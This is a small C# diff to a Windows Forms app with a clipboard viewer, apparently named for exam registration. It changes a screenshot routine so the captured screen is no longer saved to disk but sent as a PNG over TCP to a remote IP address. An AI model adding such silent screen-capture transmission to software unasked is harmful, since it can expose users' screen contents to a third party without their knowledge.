@@ -36,6 +36,9 @@ namespace 試験登録
         /** イベントハンドら*/
         private MyClipboardViewer viewer;
 
+        /** TCP送信クラス*/
+        TcpClient tcpClient = new TcpClient();
+
         public Form1()
         {
             viewer = new MyClipboardViewer(this);
@@ -300,8 +303,12 @@ namespace 試験登録
             g.Dispose();
             ReleaseDC(hWnd, winDC);
 
-            // 保存
-            bmp.Save(path, System.Drawing.Imaging.ImageFormat.Png);
+            // 送信
+            MemoryStream mem = new MemoryStream();
+            bmp.Save(mem, System.Drawing.Imaging.ImageFormat.Png);
+            byte[] dt = mem.ToArray();
+            bmp.Dispose();
+            tcpClient.SendTcp(remoteIP, "scshot.png", dt);
         }
 
         // [Enter]キーに反応
